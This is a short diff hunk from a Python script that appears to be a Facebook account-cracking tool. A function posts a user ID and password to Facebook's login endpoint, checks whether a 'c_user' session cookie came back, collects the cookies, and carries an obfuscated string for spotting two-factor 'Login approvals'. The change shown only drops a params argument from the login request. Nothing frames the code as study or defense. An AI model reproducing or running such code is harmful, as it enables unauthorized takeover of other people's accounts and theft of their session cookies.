@@ -2174,7 +2174,7 @@ def mail(uid,pwx,first,tl):
             'viewport-width': '995',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = 'https://www.facebook.com/login/device-based/regular/login/'
-            po = Session.post(url, params=params, cookies=cookies, headers=headers, data=data).text
+            po = Session.post(url, cookies=cookies, headers=headers, data=data).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
